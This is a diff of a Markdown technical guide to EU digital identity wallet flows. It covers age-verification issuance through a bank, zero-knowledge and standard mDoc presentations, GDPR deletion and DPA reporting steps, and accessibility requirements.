 **Artifact Produced:** OID4VCI `Credential Response` containing the JSON array of base64-encoded mDoc attestations.
 
 </details>
-<details><summary><strong>9. AV App stores batch locally (each used once, then deleted)</strong></summary>
+<details>
+<summary><strong>9. AV App stores batch locally (each used once, then deleted)</strong></summary>
 
 The AV App stores the batch of signed mDocs in its local secure storage. Per specification §5.2: "An Age Verification App SHALL use a Proof of Age attestation only once and then remove it from the batch." This single-use model ensures that even without ZKP, two presentations to different RPs use different attestations with different signatures, preventing signature-based correlation.
 
@@ -13558,7 +13908,8 @@ sequenceDiagram
     end
 ```
 
-<details><summary><strong>1. RP Backend constructs DCQL query for age_over_18 predicate</strong></summary>
+<details>
+<summary><strong>1. RP Backend constructs DCQL query for age_over_18 predicate</strong></summary>
 
 The RP constructs a minimal DCQL query targeting the `age_over_18` claim from the EU Age Verification Attestation (`docType: eu.europa.ec.av.1`). Unlike EUDI Wallet PID presentations (§18.5), the AV App flow does not require WRPAC client authentication — the RP's identity is self-asserted in the request. The query structure is deliberately narrow:
 
@@ -13578,14 +13929,16 @@ This requests **only** the predicate, not the user's date of birth or any other 
 **Artifact Produced:** Minimal DCQL Query (JSON) selecting solely the `age_over_18` boolean predicate.
 
 </details>
-<details><summary><strong>2. RP Backend generates cryptographic session nonce</strong></summary>
+<details>
+<summary><strong>2. RP Backend generates cryptographic session nonce</strong></summary>
 
 The RP generates a fresh, cryptographically random `nonce` (minimum 128 bits) to bind the presentation to the current session. This nonce serves as a public input to the ZKP circuit — the prover must demonstrate knowledge of a valid attestation **and** that the attestation was used to generate a proof for this specific nonce. This prevents replay attacks where a captured proof could be resubmitted to a different RP or session.
 
 > **Session binding**: The RP should associate the nonce with the active browser session (via server-side session storage or a signed cookie) so that when the proof arrives, it can verify the nonce matches the one issued in step 3.
 
 </details>
-<details><summary><strong>3. RP Backend sends OpenID4VP authorization request to AV App</strong></summary>
+<details>
+<summary><strong>3. RP Backend sends OpenID4VP authorization request to AV App</strong></summary>
 
 The RP wraps the DCQL query and nonce in an OpenID4VP authorization request and delivers it to the AV App. For same-device flows, the RP uses the W3C Digital Credentials API (`navigator.credentials.get()` with `protocol: "openid4vp"`). For cross-device flows, the RP displays a QR code encoding the request URI. The request includes:
 
@@ -13635,14 +13988,16 @@ The AV App receives the request and validates the `client_id` for display purpos
 **Artifact Produced:** OpenID4VP Authorization Request (JAR) encoding the DCQL query and session binding nonce.
 
 </details>
-<details><summary><strong>4. AV App loads Proof of Age attestation from local storage</strong></summary>
+<details>
+<summary><strong>4. AV App loads Proof of Age attestation from local storage</strong></summary>
 
 Upon receiving the OpenID4VP request, the AV App searches its local credential storage for an attestation matching the requested `docType: eu.europa.ec.av.1`. If the user has multiple attestations (e.g., from different issuers), the app presents a selection dialogue. If no valid attestation exists, the app prompts the user to obtain one from an authorised Attestation Provider (see issuance flow in §19.1.4 introduction).
 
 The attestation is an mDoc containing the `age_over_18` boolean claim, signed by the Attestation Provider's ECDSA P-256 key. Critically for ZKP, the attestation remains **in the wallet** — the RP never sees the signed mDoc itself, only a zero-knowledge proof that such an attestation exists and satisfies the predicate.
 
 </details>
-<details><summary><strong>5. AV App loads ZKP circuit definition (~315KB)</strong></summary>
+<details>
+<summary><strong>5. AV App loads ZKP circuit definition (~315KB)</strong></summary>
 
 The AV App loads the ZKP circuit definition for the age predicate. The circuit is a ~315KB binary file that encodes the mathematical constraints proving "the prover knows a valid signature over an attestation containing `age_over_18 = true`". Circuits are issued by the Commission or authorised Attestation Providers and cached locally by the AV App.
 
@@ -13651,7 +14006,8 @@ The AV App loads the ZKP circuit definition for the age predicate. The circuit i
 **Audit Telemetry:** The Wallet logs a `ZKP_CIRCUIT_INSTANTIATED` telemetry tag locally.
 
 </details>
-<details><summary><strong>6. AV App generates ZKP proof (~60ms) proving age_over_18=true without revealing DOB</strong></summary>
+<details>
+<summary><strong>6. AV App generates ZKP proof (~60ms) proving age_over_18=true without revealing DOB</strong></summary>
 
 The AV App runs the ZKP prover algorithm using the loaded circuit, the attestation, and the RP's nonce as inputs. The prover generates a cryptographic proof that:
 
@@ -13665,7 +14021,8 @@ The proof reveals **nothing else** — not the user's date of birth, not the att
 > **Unlinkability**: Each proof is cryptographically unique. Even if RP A and RP B collude and share their proofs, they cannot determine whether the same user presented to both — the proofs contain no correlatable identifiers.
 
 </details>
-<details><summary><strong>7. AV App returns ZKP proof payload to RP Backend (~325KB mDoc DeviceResponse)</strong></summary>
+<details>
+<summary><strong>7. AV App returns ZKP proof payload to RP Backend (~325KB mDoc DeviceResponse)</strong></summary>
 
 The AV App returns the ZKP proof to the RP via the OpenID4VP response channel. For same-device flows, the response is returned through the Digital Credentials API callback. For cross-device flows, the proof is POSTed to the RP's `redirect_uri`. The payload size (~325KB) is significantly larger than a standard SD-JWT presentation (~500 bytes), which may impact latency on slow mobile connections.
 
@@ -13680,12 +14037,12 @@ The response structure follows the mDoc `DeviceResponse` format, with the ZKP pr
     "docType": "eu.europa.ec.av.1",
     "issuerSigned": {
       "nameSpaces": {},
-      "issuerAuth": "<COSE_Sign1: empty for ZKP>"
+      "issuerAuth": "&lt;COSE_Sign1: empty for ZKP>"
     },
     "deviceSigned": {
       "nameSpaces": {},
       "deviceAuth": {
-        "zkProof": "<~325KB ZKP proof bytes>",
+        "zkProof": "&lt;~325KB ZKP proof bytes>",
         "apKeyId": "ap-key-id-from-trusted-list",
         "circuitHash": "sha256:abc123...",
         "nonce": "n-0S6_WzA2Mj"
@@ -13701,7 +14058,8 @@ The response structure follows the mDoc `DeviceResponse` format, with the ZKP pr
 **Artifact Produced:** Decoded `DeviceResponse` (CBOR) natively embedding the ~325KB `zkProof` struct within `deviceAuth`.
 
 </details>
-<details><summary><strong>8. RP Backend loads ZKP circuit definition (cached, ~6.76s first load)</strong></summary>
+<details>
+<summary><strong>8. RP Backend loads ZKP circuit definition (cached, ~6.76s first load)</strong></summary>
 
 The RP loads the same circuit definition used by the AV App, obtained from the Commission's trusted distribution point. The first load incurs a one-time cost of ~6.76 seconds as the library parses and compiles the circuit constraints. RPs should **pre-load circuits at startup** to avoid latency spikes on first verification.
 
@@ -13710,7 +14068,8 @@ The RP verifies the circuit's hash against a known-good value. If the hash does 
 **Audit Telemetry:** The RP explicitly triggers a `ZKP_CIRCUIT_TAMPERING_DETECTED` SIEM alert if the definition hash mismatches.
 
 </details>
-<details><summary><strong>9. RP Backend fetches Attestation Provider public key from Commission trusted list</strong></summary>
+<details>
+<summary><strong>9. RP Backend fetches Attestation Provider public key from Commission trusted list</strong></summary>
 
 The RP retrieves the Attestation Provider's public key from the EU Commission's trusted list (the same infrastructure used for EUDI Wallet issuer trust). The AP's key is an ECDSA P-256 public key, identified by a key identifier embedded in the ZKP proof. The RP caches this key to avoid repeated lookups.
 
@@ -13719,14 +14078,16 @@ If the AP's key is not in the trusted list, the RP rejects the proof with `AP_KE
 **Audit Telemetry:** The RP logs an `AP_TRUST_RESOLUTION_FAILED` event upon failing to verify the Attestation Provider against the EC trust list.
 
 </details>
-<details><summary><strong>10. Commission trusted list returns Attestation Provider public key (ECDSA P-256)</strong></summary>
+<details>
+<summary><strong>10. Commission trusted list returns Attestation Provider public key (ECDSA P-256)</strong></summary>
 
 The Commission's trusted list responds with the AP's ECDSA P-256 public key. This key is used as a public input to the ZKP verification algorithm — the prover must demonstrate knowledge of a signature from this specific key over the attestation. The RP stores the key in its cache for subsequent verifications.
 
 > **Key rotation**: AP keys are long-lived but may rotate annually. The RP should refresh its cache periodically (e.g., daily) to pick up new keys and revoked keys.
 
 </details>
-<details><summary><strong>11. RP Backend verifies ZKP proof against circuit and AP key (~466–492ms)</strong></summary>
+<details>
+<summary><strong>11. RP Backend verifies ZKP proof against circuit and AP key (~466–492ms)</strong></summary>
 
 The RP runs the ZKP verification algorithm using the `longfellow-zk` library (or equivalent implementation of `draft-google-cfrg-libzk-01`). The verifier takes three inputs:
 
@@ -13741,7 +14102,8 @@ Verification takes ~466–492ms on commodity server hardware. The algorithm conf
 **Audit Telemetry:** The RP MUST trigger a `ZKP_PROOF_VALIDATION_FAILED` SIEM alert.
 
 </details>
-<details><summary><strong>12. RP Backend verifies session nonce matches presentation binding</strong></summary>
+<details>
+<summary><strong>12. RP Backend verifies session nonce matches presentation binding</strong></summary>
 
 The RP confirms that the nonce in the proof's public inputs matches the nonce issued in step 3 and associated with the current session. This prevents replay attacks where a proof captured from one session is resubmitted in another. The RP also checks temporal proximity — the proof should arrive within a reasonable window (e.g., 5 minutes) of the nonce being issued.
 
@@ -13750,7 +14112,8 @@ If the nonce does not match or has expired, the RP rejects the presentation. The
 **Audit Telemetry:** The RP logs a `ZKP_NONCE_REPLAY_DETECTED` alert if a duplicate or expired nonce is presented.
 
 </details>
-<details><summary><strong>13. RP Backend grants or denies access to age-restricted resource</strong></summary>
+<details>
+<summary><strong>13. RP Backend grants or denies access to age-restricted resource</strong></summary>
 
 If all verification checks pass (ZKP valid, nonce matches, AP trusted, circuit trusted), the RP grants access to age-restricted content or services. The RP records `age_verified: true` in the session along with the verification timestamp and method (`av_app_zkp`). No personal data is stored — the ZKP reveals only the predicate result.
 
@@ -13811,27 +14174,32 @@ sequenceDiagram
     end
 ```
 
-<details><summary><strong>1. RP Backend constructs DCQL query and generates session nonce</strong></summary>
+<details>
+<summary><strong>1. RP Backend constructs DCQL query and generates session nonce</strong></summary>
 
 The RP constructs the same DCQL query as in the ZKP flow (requesting `age_over_18` from `docType: eu.europa.ec.av.1`) and generates a fresh cryptographic nonce. The request parameters are identical — the two flows diverge only at the AV App's response, where the app chooses between standard mDoc presentation and ZKP proof based on its configuration and capabilities.
 
 </details>
-<details><summary><strong>2. RP Backend sends OpenID4VP authorization request to AV App</strong></summary>
+<details>
+<summary><strong>2. RP Backend sends OpenID4VP authorization request to AV App</strong></summary>
 
 The JAR payload is identical to the ZKP flow (see step 3 of the ZKP walkthrough above). The RP does not specify whether it expects a ZKP or standard mDoc response — the AV App chooses the presentation mode. The RP must be prepared to handle both.
 
 </details>
-<details><summary><strong>3. AV App selects Proof of Age attestation from local batch</strong></summary>
+<details>
+<summary><strong>3. AV App selects Proof of Age attestation from local batch</strong></summary>
 
 The AV App selects one unused attestation from its locally stored batch. Per specification §5.2, each attestation is used exactly once and then deleted. This single-use model provides presentation-level unlinkability: two presentations to different RPs use different attestations with different issuer signatures, preventing signature-based correlation. However, unlike ZKP mode, the RP does receive the actual attribute value.
 
 </details>
-<details><summary><strong>4. AV App signs nonce with device key (ECDSA DeviceAuth)</strong></summary>
+<details>
+<summary><strong>4. AV App signs nonce with device key (ECDSA DeviceAuth)</strong></summary>
 
 The AV App creates a standard ISO 18013-5 `DeviceAuth` structure: a COSE_Sign1 signature over the `SessionTranscript` (which includes the RP's nonce) using the device private key bound to the attestation. This proves the presenter controls the device key associated with the credential — the same device authentication mechanism used in all mDoc presentations.
 
 </details>
-<details><summary><strong>5. AV App returns mDoc DeviceResponse to RP Backend (~1KB)</strong></summary>
+<details>
+<summary><strong>5. AV App returns mDoc DeviceResponse to RP Backend (~1KB)</strong></summary>
 
 The AV App returns the complete mDoc `DeviceResponse` containing both `issuerSigned` (the AP's signature over the attestation) and `deviceSigned` (the device signature over the session transcript). Unlike the ZKP flow (~325KB), the standard response is ~1KB — over 300× smaller.
 
@@ -13850,12 +14218,12 @@ The AV App returns the complete mDoc `DeviceResponse` containing both `issuerSig
           "elementValue": true
         }]
       },
-      "issuerAuth": "<COSE_Sign1: AP ECDSA signature over MSO>"
+      "issuerAuth": "&lt;COSE_Sign1: AP ECDSA signature over MSO>"
     },
     "deviceSigned": {
       "nameSpaces": {},
       "deviceAuth": {
-        "deviceSignature": "<COSE_Sign1: device key signature over SessionTranscript>"
+        "deviceSignature": "&lt;COSE_Sign1: device key signature over SessionTranscript>"
       }
     }
   }],
@@ -13868,17 +14236,20 @@ The AV App returns the complete mDoc `DeviceResponse` containing both `issuerSig
 **Artifact Produced:** Extracted `DeviceResponse` payload containing verifiable plaintext age conditions and the standard ECDSA device signature.
 
 </details>
-<details><summary><strong>6. RP Backend fetches AP public key from Commission trusted list</strong></summary>
+<details>
+<summary><strong>6. RP Backend fetches AP public key from Commission trusted list</strong></summary>
 
 The RP retrieves the AP's ECDSA P-256 public key from the Commission's trusted list, exactly as in the ZKP flow (step 9). The RP uses the certificate chain in the `issuerAuth` COSE_Sign1 to identify which AP signed the attestation and looks up the corresponding trust anchor.
 
 </details>
-<details><summary><strong>7. Commission trusted list returns AP public key</strong></summary>
+<details>
+<summary><strong>7. Commission trusted list returns AP public key</strong></summary>
 
 The Commission's trusted list returns the AP's public key. The RP caches this key locally for subsequent verifications (same caching strategy as the ZKP flow).
 
 </details>
-<details><summary><strong>8. RP Backend verifies issuer signature, DeviceAuth, attribute value, and nonce binding</strong></summary>
+<details>
+<summary><strong>8. RP Backend verifies issuer signature, DeviceAuth, attribute value, and nonce binding</strong></summary>
 
 The RP performs standard ISO 18013-5 mDoc verification — the same verification pipeline documented in §12 for EUDI Wallet mdoc presentations. The verification steps are:
 
@@ -14071,17 +14442,20 @@ sequenceDiagram
     end
 ```
 
-<details><summary><strong>1. User opens banking app and selects "Get Age Verification"</strong></summary>
+<details>
+<summary><strong>1. User opens banking app and selects "Get Age Verification"</strong></summary>
 
 The user navigates to their banking app — the same app they use for everyday banking — and finds an option to obtain an age verification credential. This might appear under account settings, a "Digital Identity" section, or as a promoted feature. The bank presents this as a value-added service: "Prove your age online without scanning your passport." The user taps the option, which initiates the 3rd-party issuance flow. No separate authentication is needed — the user is already logged into their banking app via the bank's existing SCA mechanisms (PSD2 Art. 97).
 
 </details>
-<details><summary><strong>2. Banking App verifies customer identity from existing KYC data</strong></summary>
+<details>
+<summary><strong>2. Banking App verifies customer identity from existing KYC data</strong></summary>
 
 The bank consults its internal Customer Due Diligence (CDD) records — the same records established during account opening (§22). The customer's date of birth is already on file at LoA High (the bank verified it from a government-issued identity document during the original onboarding, per AMLD Art. 13). The bank's backend confirms the customer is over 18 by checking the stored DOB against the current date. No new identity document scanning is required — the bank reuses the identity proofing it has already performed. This is the key advantage of the 3rd-party issuance model: it eliminates the need for the user to re-prove their identity with a passport or eID.
 
 </details>
-<details><summary><strong>3. Banking App transmits identity proofing result to Attestation Provider</strong></summary>
+<details>
+<summary><strong>3. Banking App transmits identity proofing result to Attestation Provider</strong></summary>
 
 The bank sends the identity proofing result to the Attestation Provider via a proprietary backend API (spec §3.2.1 — the AP-to-Authentic Source interface is not standardised). The payload includes: (a) confirmation that the user's age exceeds the threshold (age > 18), (b) the proofing method used (e.g., "CDD records, originally verified from passport NFC in 2023"), (c) the Level of Assurance achieved (LoA High in this case, since CDD requires documentary verification). Crucially, the bank does **not** transmit the user's name, date of birth, or any other personally identifiable information to the AP — only the age assertion and the proofing metadata. The AP needs to know *that* the user is over 18 and *how* this was verified, not *who* the user is.
 
@@ -14090,7 +14464,8 @@ The bank sends the identity proofing result to the Attestation Provider via a pr
 **Artifact Produced:** Proprietary identity proofing assertion payload containing the `age_over_18=true` flag, proofing method descriptor, and LoA metadata.
 
 </details>
-<details><summary><strong>4. Attestation Provider validates the proofing result meets LoA Substantial or High</strong></summary>
+<details>
+<summary><strong>4. Attestation Provider validates the proofing result meets LoA Substantial or High</strong></summary>
 
 The AP receives the bank's identity proofing result and evaluates whether it satisfies the specification's requirement: "An Attestation Provider SHALL NOT issue a Proof of Age attestation before verifying the attestation subject's age at the Level of Assurance 'substantial' or 'high'" (spec §5.3). Since banks perform CDD at LoA High (documentary identity verification with cross-checking against authoritative sources), the AP accepts the bank's proofing as meeting the threshold. If the proofing had been at a lower LoA (e.g., self-asserted age), the AP would reject it. The AP logs the proofing method and LoA for audit purposes.
 
@@ -14099,12 +14474,14 @@ The AP receives the bank's identity proofing result and evaluates whether it sat
 **Audit Telemetry:** The Attestation Provider MUST log an `ISSUANCE_LOA_VALIDATION_FAILED` alert.
 
 </details>
-<details><summary><strong>5. Attestation Provider generates pre-authorized_code and tx_code</strong></summary>
+<details>
+<summary><strong>5. Attestation Provider generates pre-authorized_code and tx_code</strong></summary>
 
 The AP generates the OID4VCI pre-authorized code flow credentials (identical to the SCA attestation pattern in §15.4): a one-time `pre-authorized_code` (short-lived, typically 5–10 minutes) and a `tx_code` (6-digit PIN or OTP) for out-of-band user binding. The `tx_code` ensures that even if the QR code or deep link is intercepted, the attacker cannot redeem the credential offer without the second factor. The pre-authorized code is bound to the bank's authenticated session — it cannot be reused.
 
 </details>
-<details><summary><strong>6. Attestation Provider returns Credential Offer to Banking App</strong></summary>
+<details>
+<summary><strong>6. Attestation Provider returns Credential Offer to Banking App</strong></summary>
 
 The AP sends the credential offer back to the bank's backend. The credential offer follows the standard OID4VCI format (§15.4) with the `eu.europa.ec.av.1` credential type:
 
@@ -14128,17 +14505,20 @@ The AP sends the credential offer back to the bank's backend. The credential off
 **Artifact Produced:** Standard OID4VCI `credential_offer` JSON payload containing the `pre-authorized_code` and `tx_code` configuration parameters.
 
 </details>
-<details><summary><strong>7. Banking App displays QR code or deep link plus PIN to user</strong></summary>
+<details>
+<summary><strong>7. Banking App displays QR code or deep link plus PIN to user</strong></summary>
 
 The bank's app renders the credential offer as either a QR code (for cross-device scanning) or a deep link (for same-device tap). Alongside the QR code, the app displays the `tx_code` (e.g., "Your PIN: 847293"). The user sees a screen like: "Scan this QR code with your Age Verification App and enter PIN 847293 to receive your age verification credentials." The QR code encodes a `credential_offer_uri` pointing to the AP's credential offer endpoint. The deep link targets the AV App's custom URL scheme (e.g., `openid-credential-offer://...`).
 
 </details>
-<details><summary><strong>8. User opens AV App and scans QR code or follows deep link</strong></summary>
+<details>
+<summary><strong>8. User opens AV App and scans QR code or follows deep link</strong></summary>
 
 The user switches to their AV App (or it opens automatically via deep link) and scans the QR code displayed in the banking app. The AV App parses the credential offer, identifies the credential type (`eu.europa.ec.av.1`), and displays a confirmation screen: "Receive age verification credentials from [AP name]?" The user confirms and enters the PIN displayed in the banking app. This two-factor binding (credential offer + PIN) ensures the attestation batch is delivered only to the user who initiated the process in the banking app.
 
 </details>
-<details><summary><strong>9. AV App exchanges pre-authorized_code at AP Token Endpoint</strong></summary>
+<details>
+<summary><strong>9. AV App exchanges pre-authorized_code at AP Token Endpoint</strong></summary>
 
 The AV App sends an HTTP POST to the AP's Token Endpoint, exchanging the pre-authorized code and tx_code for an access token:
 
@@ -14159,26 +14539,28 @@ The AP validates the code (one-time use, not expired) and the tx_code (matching 
 **Audit Telemetry:** The AP logs a `PRE_AUTH_CODE_EXCHANGE_FAILED` security event.
 
 </details>
-<details><summary><strong>10. AP returns access token to AV App</strong></summary>
+<details>
+<summary><strong>10. AP returns access token to AV App</strong></summary>
 
 The AP issues an access token scoped to credential issuance. This is a standard OAuth 2.0 access token, valid for the duration of the issuance ceremony (typically a few minutes). The AV App uses this token to authenticate subsequent credential requests.
 
 </details>
-<details><summary><strong>11. AV App requests batch of Proof of Age attestations</strong></summary>
+<details>
+<summary><strong>11. AV App requests batch of Proof of Age attestations</strong></summary>
 
 The AV App sends a credential request to the AP's Credential Endpoint, specifying the batch size and providing a device public key for binding:
 
 ```http
 POST /credential HTTP/1.1
 Host: ap.example.eu
-Authorization: Bearer <access_token>
+Authorization: Bearer &lt;access_token>
 Content-Type: application/json
 
 {
   "credential_identifier": "eu.europa.ec.av.1",
   "proof": {
     "proof_type": "jwt",
-    "jwt": "<device_key_proof_JWT>"
+    "jwt": "&lt;device_key_proof_JWT>"
   }
 }
 ```
@@ -14192,34 +14574,40 @@ The `proof.jwt` contains a proof of possession of the device key, ensuring the r
 **Artifact Produced:** OID4VCI `credential_request` JSON payload embedding the `proof.jwt` POP structure.
 
 </details>
-<details><summary><strong>12. Attestation Provider generates N mDocs with docType eu.europa.ec.av.1</strong></summary>
+<details>
+<summary><strong>12. Attestation Provider generates N mDocs with docType eu.europa.ec.av.1</strong></summary>
 
 The AP generates a batch of N mDoc credentials, each with the single boolean attribute `age_over_18 = true` in the `eu.europa.ec.av.1` namespace. Each mDoc has a unique `ValidityInfo` structure with coarse-grained timestamps (spec §5.3) to prevent temporal fingerprinting. The attestation data model is identical regardless of whether the identity proofing came from a bank, a passport scan, or an eIDAS node — the issuance method is not encoded in the attestation.
 
 </details>
-<details><summary><strong>13. Attestation Provider signs each mDoc with AP ECDSA P-256 key</strong></summary>
+<details>
+<summary><strong>13. Attestation Provider signs each mDoc with AP ECDSA P-256 key</strong></summary>
 
 Each mDoc is signed with the AP's ECDSA P-256 key, producing a COSE_Sign1 `issuerAuth` structure. The signing key chains to the Commission's root trust anchor via the AP's certificate on the Trusted List. The AP signs the attestation — not the bank. The bank's involvement is entirely upstream (identity proofing) and leaves no cryptographic trace in the attestation itself.
 
 </details>
-<details><summary><strong>14. Attestation Provider returns Credential Response with batch of N signed mDocs</strong></summary>
+<details>
+<summary><strong>14. Attestation Provider returns Credential Response with batch of N signed mDocs</strong></summary>
 
 The AP returns the full batch in a single OID4VCI credential response. The batch delivery is identical to the eID-based and passport-based flows described in §19.1.4 — the AV App cannot distinguish which identity proofing method was used, and neither can any RP that later verifies a presentation.
 
 **Artifact Produced:** OID4VCI Credential Response payload containing the base64url-encoded array of issued `eu.europa.ec.av.1` mDoc attestations.
 
 </details>
-<details><summary><strong>15. AV App stores batch locally (each used once, then deleted)</strong></summary>
+<details>
+<summary><strong>15. AV App stores batch locally (each used once, then deleted)</strong></summary>
 
 The AV App stores the batch in its local secure storage. Per specification §5.2, each attestation is used exactly once and then permanently deleted. The batch management (stock monitoring, replenishment prompts) is identical to eID-based issuance. When the batch runs low, the user must re-authenticate — either through the banking app again (re-triggering this flow) or through an alternative enrolment method.
 
 </details>
-<details><summary><strong>16. AV App selects one attestation from batch for presentation</strong></summary>
+<details>
+<summary><strong>16. AV App selects one attestation from batch for presentation</strong></summary>
 
 When the user needs to prove their age to a Relying Party, the AV App selects one unused attestation from the batch. The presentation flow follows the standard ZKP (§19.1.4, ZKP diagram) or mDoc (§19.1.4, standard mDoc diagram) path — the RP receives an identical attestation regardless of which issuance method was used. See §19.1.4 for the complete presentation protocol.
 
 </details>
-<details><summary><strong>17. User presents age proof to any RP via standard mDoc or ZKP flow</strong></summary>
+<details>
+<summary><strong>17. User presents age proof to any RP via standard mDoc or ZKP flow</strong></summary>
 
 The user presents the Proof of Age attestation to any Relying Party using the standard presentation flows documented in §19.1.4. The RP verifies the attestation against the AP's public key (fetched from the Commission's Trusted List) — the bank is invisible to the RP. The RP cannot determine whether the attestation was obtained via a banking app, passport scan, eIDAS node, or face-to-face counter. This issuance-method opacity is a deliberate privacy feature: it prevents RPs from discriminating based on the user's chosen enrolment path.
 
@@ -14294,22 +14682,26 @@ sequenceDiagram
     end
 ```
 
-<details><summary><strong>1. User opens Wallet Unit transaction log dashboard</strong></summary>
+<details>
+<summary><strong>1. User opens Wallet Unit transaction log dashboard</strong></summary>
 
 The User opens their EUDI Wallet and navigates to the privacy dashboard or transaction history section. The Wallet maintains a local log of every presentation interaction (mandated by CIR 2024/2979 Art. 5.8) — including the RP's identity, the attributes disclosed, the date/time, and the purpose. This log is stored locally on the device and never transmitted to any external party. The dashboard serves as the User's central control point for exercising GDPR data subject rights (Art. 15–22).
 
 </details>
-<details><summary><strong>2. Wallet Unit displays past interactions to User</strong></summary>
+<details>
+<summary><strong>2. Wallet Unit displays past interactions to User</strong></summary>
 
 The Wallet displays a chronological list of past presentations, each entry showing: the RP's verified legal name (from the WRPAC Subject at the time of presentation), the date and time of the interaction, the attributes that were disclosed (e.g., `family_name`, `given_name`, `birth_date`), and the stated purpose (from the WRPRC or Registrar). The User can browse, filter, and search this log. Entries older than the configured retention period (TS7 DATA_DLT_06) may be automatically purged from the local log, but the User can export them before deletion.
 
 </details>
-<details><summary><strong>3. User selects RP and chooses "Request data deletion"</strong></summary>
+<details>
+<summary><strong>3. User selects RP and chooses "Request data deletion"</strong></summary>
 
 The User selects a specific RP from the transaction log and taps *"Request data deletion"* (or equivalent). This action invokes the GDPR Art. 17 right to erasure natively from within the Wallet UI. The Wallet records the User's intent and prepares to contact the RP. The User may select individual presentation sessions (e.g., *"Delete data from the July 15 interaction"*) or request deletion of all data held by that RP. The Wallet initiates the contact procedure (step 4) without requiring the User to manually find the RP's privacy contact information.
 
 </details>
-<details><summary><strong>4. Wallet Unit retrieves RP supportURI from WRPRC or Registrar API</strong></summary>
+<details>
+<summary><strong>4. Wallet Unit retrieves RP supportURI from WRPRC or Registrar API</strong></summary>
 
 The Wallet Unit attempts to find the RP's contact method (`supportURI`). It checks the locally cached WRPRC (Wallet Relying Party Registration Certificate). If not available, it queries the Registrar API:
 
@@ -14340,14 +14732,16 @@ The Wallet prioritizes the website URL (`https://`), falling back to email, then
 **Artifact Produced:** Extracted `supportURI` resolution payload from the Registrar's JWT.
 
 </details>
-<details><summary><strong>5. Wallet Unit opens RP's support page in browser (Website fallback)</strong></summary>
+<details>
+<summary><strong>5. Wallet Unit opens RP's support page in browser (Website fallback)</strong></summary>
 
 If the `supportURI` is a website URL (the preferred option per DATA_DLT_02), the Wallet opens the RP's GDPR deletion page in the device's secure browser. The User completes the deletion request on the RP's own infrastructure, providing any additional verification the RP may require. This is the most reliable path because the RP can immediately process the request through its existing data subject rights portal.
 
 **Audit Telemetry:** The RP MUST log a `GDPR_DELETION_REQUEST_RECEIVED` event upon successful submission via the support portal.
 
 </details>
-<details><summary><strong>6. Wallet Unit composes pre-filled deletion email (Email fallback)</strong></summary>
+<details>
+<summary><strong>6. Wallet Unit composes pre-filled deletion email (Email fallback)</strong></summary>
 
 If the `supportURI` is an email address, the Wallet composes a pre-filled draft (DATA_DLT_08 / DATA_DLT_09) in the device's default email client, allowing the User to review and edit before sending:
 
@@ -14375,7 +14769,8 @@ Per DATA_DLT_06, the Wallet silently logs the initiation date, target RP, and ta
 **Artifact Produced:** Pre-filled GDPR Art. 17 data deletion email template generated sequentially by the Wallet.
 
 </details>
-<details><summary><strong>7. Wallet Unit initiates phone call to RP support (Phone fallback)</strong></summary>
+<details>
+<summary><strong>7. Wallet Unit initiates phone call to RP support (Phone fallback)</strong></summary>
 
 If the `supportURI` is a phone number, the Wallet prompts the device to dial the RP's support number directly. This is the least structured option — the User must verbally communicate their deletion request. The Wallet still logs the initiation of the phone-based request in its internal tracking log for auditability.
 
@@ -14447,27 +14842,32 @@ sequenceDiagram
     Wallet->>DPA: Submit report
 ```
 
-<details><summary><strong>1. User views Wallet Unit transaction log</strong></summary>
+<details>
+<summary><strong>1. User views Wallet Unit transaction log</strong></summary>
 
 The User views their local, cryptographically retained transaction log in the Wallet dashboard, which surfaces historical presentations as mandated by TS10.
 
 </details>
-<details><summary><strong>2. User selects suspicious transaction in Wallet Unit</strong></summary>
+<details>
+<summary><strong>2. User selects suspicious transaction in Wallet Unit</strong></summary>
 
 After identifying unexpected data requests, the User selects the specific suspicious transaction to review the complete log entry.
 
 </details>
-<details><summary><strong>3. User chooses "Report to DPA" in Wallet Unit</strong></summary>
+<details>
+<summary><strong>3. User chooses "Report to DPA" in Wallet Unit</strong></summary>
 
 The User pro-actively chooses the "Report to Data Protection Authority" action provided within the Wallet UI.
 
 </details>
-<details><summary><strong>4. Wallet Unit retrieves DPA contact information</strong></summary>
+<details>
+<summary><strong>4. Wallet Unit retrieves DPA contact information</strong></summary>
 
 The Wallet Unit seamlessly queries the local WRPRC cache or contacts the national Registrar API to securely pull the responsible `supervisoryAuthority.email` string.
 
 </details>
-<details><summary><strong>5. Registrar API returns supervisoryAuthority.email</strong></summary>
+<details>
+<summary><strong>5. Registrar API returns supervisoryAuthority.email</strong></summary>
 
 The Registrar API responds with the structured DPA contact payload, which includes the `supervisoryAuthority.email` field for the competent Data Protection Authority responsible for the Member State where the RP is registered. This ensures the Wallet routes the report to the correct national authority even in cross-border scenarios.
 
@@ -14478,14 +14878,16 @@ The Registrar API responds with the structured DPA contact payload, which includ
 **Artifact Produced:** Parsed Registration Data matching the `supervisoryAuthority.email` claim.
 
 </details>
-<details><summary><strong>6. Wallet Unit composes pre-filled report</strong></summary>
+<details>
+<summary><strong>6. Wallet Unit composes pre-filled report</strong></summary>
 
 The Wallet Unit compiles a structured evidence package—including RP identity, exact date/time, a forensic diff of actual requested attributes versus registered baseline scope, and User annotations—readying it for formal evaluation.
 
 **Artifact Produced:** Secure DPA incident report bundle, encompassing transaction metadata, cryptographic evidence of the request JAR, and the attribute delta.
 
 </details>
-<details><summary><strong>7. Wallet Unit submits report to DPA</strong></summary>
+<details>
+<summary><strong>7. Wallet Unit submits report to DPA</strong></summary>
 
 The Wallet transmits the pre-filled report to the competent DPA via the retrieved `supervisoryAuthority.email` contact. Depending on the DPA's integration level, this may be an email submission (DATA_RPT_05) or a structured API call if the DPA exposes a digital reporting endpoint. The Wallet logs the submission in its internal audit trail.
 
@@ -14767,7 +15169,7 @@ The following table maps the most critical WCAG 2.1 AA and WCAG 2.2 success crit
 | WCAG SC | Title | RP Component | Requirement |
 |:--------|:------|:-------------|:------------|
 | **1.1.1** | Non-text Content | QR code image | Provide descriptive `alt` text: e.g., `alt="QR code to initiate identity verification — scan with EUDI Wallet or use link below"`. Avoid generic `alt="QR code"` |
-| **1.3.1** | Info and Relationships | Consent screen attribute list | Use semantic HTML (`<table>`, `<dl>`, `<ul>`) to structure attribute lists; use `<fieldset>`/`<legend>` for grouped controls |
+| **1.3.1** | Info and Relationships | Consent screen attribute list | Use semantic HTML (`<table>`, `&lt;dl>`, `<ul>`) to structure attribute lists; use `&lt;fieldset>`/`&lt;legend>` for grouped controls |
 | **1.4.1** | Use of Colour | Verification result | Traffic-light indicators must be supplemented with text: "✅ Verified", "❌ Not verified", "⚠️ Partially verified" |
